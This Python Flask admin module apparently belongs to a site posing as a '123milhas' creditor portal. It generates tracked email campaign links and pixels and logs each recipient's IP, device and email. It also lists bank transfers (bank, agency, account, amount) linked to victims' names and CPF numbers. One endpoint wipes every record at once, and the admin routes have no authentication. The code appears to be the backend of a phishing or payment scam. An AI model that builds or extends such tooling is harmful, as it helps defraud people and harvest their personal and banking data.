# app/routes/admin_routes.py
from flask import Blueprint, request, jsonify
import sqlite3
import json
import string
import random
import hmac
import hashlib
import base64
import time
from datetime import datetime
from zoneinfo import ZoneInfo

admin_bp = Blueprint("admin", __name__)

# ============================================
# CONFIGURAÇÕES PARA TOKEN
# ============================================
TRACKING_SECRET = b"123milhas-secret-key-2024"
BASE_URL = "https://123milhas-rj-credor.com.br"  # URL de produção


def now_utc():
    return datetime.now(ZoneInfo("UTC")).strftime("%Y-%m-%d %H:%M:%S")


def now_brasilia():
    return datetime.now(ZoneInfo("America/Sao_Paulo")).strftime("%Y-%m-%d %H:%M:%S")


def sign_payload(data: dict) -> str:
    """Assina um payload para tracking"""
    payload = json.dumps(data, separators=(",", ":"), ensure_ascii=False).encode()
    sig = hmac.new(TRACKING_SECRET, payload, hashlib.sha256).hexdigest()
    raw = base64.urlsafe_b64encode(payload).decode().rstrip("=")
    return f"{raw}.{sig}"


def make_tracking_token(
    operator: str, campaign: str, client_id: str, email: str = ""
) -> str:
    """Gera token de tracking"""
    ts = int(time.time())
    return sign_payload(
        {
            "operator": operator,
            "campaign": campaign,
            "client_id": client_id,
            "email": email,
            "ts": ts,
        }
    )


def gerar_codigo_curto(tamanho=6):
    """Gera código aleatório com letras maiúsculas, minúsculas e números"""
    caracteres = string.ascii_letters + string.digits
    return "".join(random.choices(caracteres, k=tamanho))


def criar_link_curto(original_url):
    """Cria link curto para a URL"""
    conn = sqlite3.connect("123milhas.db")
    cursor = conn.cursor()

    # Criar tabela se não existir
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS short_links (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            short_code TEXT UNIQUE,
            original_url TEXT,
            created_at TEXT,
            cliques INTEGER DEFAULT 0
        )
    """)
    conn.commit()

    # Verificar se já existe
    cursor.execute(
        "SELECT short_code FROM short_links WHERE original_url = ?", (original_url,)
    )
    existing = cursor.fetchone()
    if existing:
        conn.close()
        return f"{BASE_URL}/s/{existing[0]}"

    # Gerar código único
    while True:
        short_code = gerar_codigo_curto(6)
        cursor.execute("SELECT id FROM short_links WHERE short_code = ?", (short_code,))
        if not cursor.fetchone():
            break

    cursor.execute(
        "INSERT INTO short_links (short_code, original_url, created_at) VALUES (?, ?, ?)",
        (short_code, original_url, now_brasilia()),
    )
    conn.commit()
    conn.close()

    return f"{BASE_URL}/s/{short_code}"


# ============================================
# ROTA PARA GERAR TOKEN (Campanhas)
# ============================================


@admin_bp.route("/generate_token", methods=["POST"])
def generate_tracking_token():
    """Gera token de tracking para campanhas"""
    try:
        data = request.json
        operator = data.get("operator", "admin")
        campaign = data.get("campaign")
        client_id = data.get("client_id")
        email = data.get("email", "")

        if not campaign or not client_id:
            return (
                jsonify(
                    {
                        "success": False,
                        "message": "Campaign e client_id são obrigatórios",
                    }
                ),
                400,
            )

        token = make_tracking_token(operator, campaign, client_id, email)

        # Registrar envio de email
        conn = sqlite3.connect("123milhas.db")
        cursor = conn.cursor()

        # Criar tabela se não existir
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS email_sends (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                operator TEXT NOT NULL,
                campaign TEXT NOT NULL,
                client_id TEXT,
                email TEXT,
                sent_at TEXT NOT NULL,
                ip TEXT,
                user_agent TEXT
            )
        """)
        conn.commit()

        cursor.execute(
            """
            INSERT INTO email_sends (operator, campaign, client_id, email, sent_at, ip, user_agent)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        """,
            (
                operator,
                campaign,
                client_id,
                email,
                now_brasilia(),
                request.remote_addr,
                request.headers.get("User-Agent", ""),
            ),
        )

        conn.commit()
        conn.close()

        # URLs de tracking
        pixel_url = f"{BASE_URL}/api/track/email/{token}"
        click_url = f"{BASE_URL}/api/track/click/{token}"
        click_curto = criar_link_curto(click_url)

        return jsonify(
            {
                "success": True,
                "token": token,
                "pixel_url": pixel_url,
                "click_url_base": click_curto,
                "click_url_original": click_url,
                "message": "Token gerado com sucesso",
            }
        )

    except Exception as e:
        print(f"Erro ao gerar token: {e}")
        return jsonify({"success": False, "message": str(e)}), 500


# ============================================
# ROTA PARA GERAR LINK CURTO ALEATÓRIO
# ============================================


@admin_bp.route("/gerar_link", methods=["POST"])
def gerar_link_curto():
    """Gera um link curto aleatório para tracking"""
    try:
        data = request.json
        url_destino = data.get("url", f"{BASE_URL}/")

        # Validação básica da URL
        if not url_destino.startswith("http"):
            url_destino = f"https://{url_destino}"

        conn = sqlite3.connect("123milhas.db")
        cursor = conn.cursor()

        # Garantir que a tabela existe
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS short_links (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                short_code TEXT UNIQUE,
                original_url TEXT,
                created_at TEXT,
                cliques INTEGER DEFAULT 0
            )
        """)
        conn.commit()

        # Gerar código único
        while True:
            codigo = gerar_codigo_curto(8)  # 8 caracteres para mais segurança
            cursor.execute("SELECT id FROM short_links WHERE short_code = ?", (codigo,))
            if not cursor.fetchone():
                break

        # Salvar no banco
        cursor.execute(
            """
            INSERT INTO short_links (short_code, original_url, created_at)
            VALUES (?, ?, ?)
        """,
            (codigo, url_destino, now_brasilia()),
        )

        conn.commit()
        conn.close()

        link_curto = f"{BASE_URL}/s/{codigo}"

        return jsonify(
            {
                "success": True,
                "short_code": codigo,
                "short_url": link_curto,
                "original_url": url_destino,
                "created_at": now_brasilia(),
            }
        )

    except Exception as e:
        print(f"Erro ao gerar link: {e}")
        return jsonify({"success": False, "error": str(e)}), 500


# ============================================
# ROTA PARA LISTAR LINKS GERADOS
# ============================================


@admin_bp.route("/links", methods=["GET"])
def listar_links():
    """Lista todos os links curtos gerados com estatísticas de cliques"""
    try:
        conn = sqlite3.connect("123milhas.db")
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()

        # Criar tabela se não existir
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS link_clicks (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                short_code TEXT,
                original_url TEXT,
                clicked_at TEXT,
                ip_address TEXT,
                user_agent TEXT,
                device_type TEXT,
                browser TEXT,
                os TEXT
            )
        """)
        conn.commit()

        cursor.execute("""
            SELECT 
                sl.short_code,
                sl.original_url,
                sl.created_at,
                COUNT(lc.id) as total_cliques
            FROM short_links sl
            LEFT JOIN link_clicks lc ON sl.short_code = lc.short_code
            GROUP BY sl.short_code
            ORDER BY sl.created_at DESC
            LIMIT 100
        """)

        rows = cursor.fetchall()
        conn.close()

        links = []
        for row in rows:
            links.append(
                {
                    "short_code": row["short_code"],
                    "short_url": f"{BASE_URL}/s/{row['short_code']}",
                    "original_url": row["original_url"],
                    "created_at": row["created_at"],
                    "cliques": row["total_cliques"] or 0,
                }
            )

        return jsonify({"success": True, "total": len(links), "links": links})

    except Exception as e:
        print(f"Erro ao listar links: {e}")
        return jsonify({"success": False, "error": str(e)}), 500


# ============================================
# ROTA PARA ESTATÍSTICAS DE UM LINK ESPECÍFICO
# ============================================


@admin_bp.route("/link/<short_code>", methods=["GET"])
def estatisticas_link(short_code):
    """Retorna estatísticas detalhadas de um link específico"""
    try:
        conn = sqlite3.connect("123milhas.db")
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()

        # Informações do link
        cursor.execute(
            """
            SELECT short_code, original_url, created_at
            FROM short_links
            WHERE short_code = ?
        """,
            (short_code,),
        )

        link = cursor.fetchone()

        if not link:
            conn.close()
            return jsonify({"success": False, "error": "Link não encontrado"}), 404

        # Cliques do link
        cursor.execute(
            """
            SELECT 
                COUNT(*) as total,
                COUNT(DISTINCT ip_address) as ips_unicos
            FROM link_clicks
            WHERE short_code = ?
        """,
            (short_code,),
        )

        cliques = cursor.fetchone()

        # Cliques por dispositivo
        cursor.execute(
            """
            SELECT device_type, COUNT(*) as total
            FROM link_clicks
            WHERE short_code = ?
            GROUP BY device_type
        """,
            (short_code,),
        )

        por_dispositivo = [dict(row) for row in cursor.fetchall()]

        # Últimos 10 cliques
        cursor.execute(
            """
            SELECT clicked_at, ip_address, device_type, browser, os
            FROM link_clicks
            WHERE short_code = ?
            ORDER BY clicked_at DESC
            LIMIT 10
        """,
            (short_code,),
        )

        ultimos_cliques = [dict(row) for row in cursor.fetchall()]

        conn.close()

        return jsonify(
            {
                "success": True,
                "link": {
                    "short_code": link["short_code"],
                    "short_url": f"{BASE_URL}/s/{link['short_code']}",
                    "original_url": link["original_url"],
                    "created_at": link["created_at"],
                },
                "estatisticas": {
                    "total_cliques": cliques["total"] or 0,
                    "ips_unicos": cliques["ips_unicos"] or 0,
                },
                "por_dispositivo": por_dispositivo,
                "ultimos_cliques": ultimos_cliques,
            }
        )

    except Exception as e:
        print(f"Erro ao obter estatísticas do link: {e}")
        return jsonify({"success": False, "error": str(e)}), 500


# ============================================
# ROTAS DE CONSULTA (Transferências)
# ============================================


@admin_bp.route("/consultar", methods=["GET"])
def consultar_tudo():
    """Consulta TODAS as transferências com filtros opcionais"""
    try:
        conn = sqlite3.connect("123milhas.db")
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()

        nome = request.args.get("nome", "").strip()
        cpf = request.args.get("cpf", "").strip()
        data_inicio = request.args.get("data_inicio", "").strip()
        data_fim = request.args.get("data_fim", "").strip()
        status = request.args.get("status", "").strip()

        query = """
            SELECT 
                t.transferencia_id as id,
                t.banco_nome as banco,
                t.agencia,
                t.conta,
                t.valor,
                t.status,
                t.created_at as data,
                v.nome as cliente_nome,
                v.cpf as cliente_cpf,
                v.email as cliente_email,
                v.dispositivo_tipo,
                v.dispositivo_os,
                v.dispositivo_browser,
                v.ip_address as ip,
                v.created_at as data_cadastro
            FROM transferencias_registro t
            LEFT JOIN tracking_visits v ON t.tracking_id = v.tracking_id
            WHERE 1=1
        """
        params = []

        if nome:
            query += " AND v.nome LIKE ?"
            params.append(f"%{nome}%")
        if cpf:
            cpf_limpo = cpf.replace(".", "").replace("-", "")
            query += " AND v.cpf = ?"
            params.append(cpf_limpo)
        if data_inicio:
            query += " AND date(t.created_at) >= date(?)"
            params.append(data_inicio)
        if data_fim:
            query += " AND date(t.created_at) <= date(?)"
            params.append(data_fim)
        if status:
            query += " AND t.status = ?"
            params.append(status)

        query += " ORDER BY t.created_at DESC LIMIT 100"
        cursor.execute(query, params)
        rows = cursor.fetchall()
        conn.close()

        transferencias = [dict(row) for row in rows]

        return jsonify(
            {
                "success": True,
                "total": len(transferencias),
                "transferencias": transferencias,
            }
        )

    except Exception as e:
        print(f"Erro: {e}")
        return jsonify({"success": False, "error": str(e)}), 500


@admin_bp.route("/estatisticas", methods=["GET"])
def estatisticas():
    """Estatísticas simples"""
    try:
        conn = sqlite3.connect("123milhas.db")
        cursor = conn.cursor()

        cursor.execute("SELECT COUNT(*) FROM transferencias_registro")
        total = cursor.fetchone()[0]

        cursor.execute(
            "SELECT COUNT(DISTINCT cpf) FROM tracking_visits WHERE cpf IS NOT NULL AND cpf != ''"
        )
        clientes = cursor.fetchone()[0]

        cursor.execute(
            "SELECT COUNT(*) FROM transferencias_registro WHERE date(created_at) = date('now', 'localtime')"
        )
        hoje = cursor.fetchone()[0]

        # Total de links gerados
        cursor.execute("SELECT COUNT(*) FROM short_links")
        total_links = cursor.fetchone()[0]

        # Total de cliques
        cursor.execute("SELECT COUNT(*) FROM link_clicks")
        total_cliques = cursor.fetchone()[0]

        conn.close()

        return jsonify(
            {
                "success": True,
                "total_transferencias": total,
                "total_clientes": clientes,
                "transferencias_hoje": hoje,
                "total_links": total_links,
                "total_cliques": total_cliques,
            }
        )
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500


@admin_bp.route("/detalhe/<transferencia_id>", methods=["GET"])
def detalhe(transferencia_id):
    """Detalhe de uma transferência"""
    try:
        conn = sqlite3.connect("123milhas.db")
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()

        cursor.execute(
            """
            SELECT 
                t.*,
                v.nome, v.cpf, v.email, v.dispositivo_tipo, v.dispositivo_os,
                v.dispositivo_browser, v.ip_address, v.user_agent
            FROM transferencias_registro t
            LEFT JOIN tracking_visits v ON t.tracking_id = v.tracking_id
            WHERE t.transferencia_id = ?
        """,
            (transferencia_id,),
        )

        row = cursor.fetchone()
        conn.close()

        if not row:
            return jsonify({"success": False, "error": "Não encontrado"}), 404

        return jsonify({"success": True, "transferencia": dict(row)})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500


# ============================================
# ROTA PARA LIMPAR TODOS OS REGISTROS (TESTE)
# ============================================


@admin_bp.route("/limpar_tudo", methods=["DELETE"])
def limpar_todos_registros():
    """⚠️ ATENÇÃO: Remove TODOS os registros do banco de dados (uso apenas para testes)

    Remove registros de:
    - transferencias_registro
    - tracking_visits
    - tracking_events
    - short_links
    - link_clicks
    - email_sends
    """
    try:
        # Verificar token de confirmação para segurança
        confirmacao = request.args.get("confirmar", "").lower()

        if confirmacao != "sim":
            return (
                jsonify(
                    {
                        "success": False,
                        "error": "Confirmação necessária. Use ?confirmar=sim para prosseguir",
                        "aviso": "Isso irá remover TODOS os dados permanentemente!",
                    }
                ),
                400,
            )

        conn = sqlite3.connect("123milhas.db")
        cursor = conn.cursor()

        # Contar registros antes de deletar
        tabelas = [
            "transferencias_registro",
            "tracking_visits",
            "tracking_events",
            "short_links",
            "link_clicks",
            "email_sends",
        ]

        contagem = {}
        for tabela in tabelas:
            try:
                cursor.execute(f"SELECT COUNT(*) FROM {tabela}")
                contagem[tabela] = cursor.fetchone()[0]
            except sqlite3.OperationalError:
                contagem[tabela] = 0

        # Deletar registros
        total_removidos = 0
        for tabela in tabelas:
            try:
                cursor.execute(f"DELETE FROM {tabela}")
                total_removidos += cursor.rowcount
                print(f"🗑️ Removidos {cursor.rowcount} registros de {tabela}")
            except sqlite3.OperationalError as e:
                print(f"⚠️ Tabela {tabela} não existe: {e}")

        # Resetar sequências (SQLite)
        cursor.execute("DELETE FROM sqlite_sequence")

        conn.commit()
        conn.close()

        return jsonify(
            {
                "success": True,
                "message": f"✅ {total_removidos} registros removidos com sucesso!",
                "detalhes": contagem,
                "total_removido": total_removidos,
            }
        )

    except Exception as e:
        print(f"❌ Erro ao limpar registros: {e}")
        return jsonify({"success": False, "error": str(e)}), 500
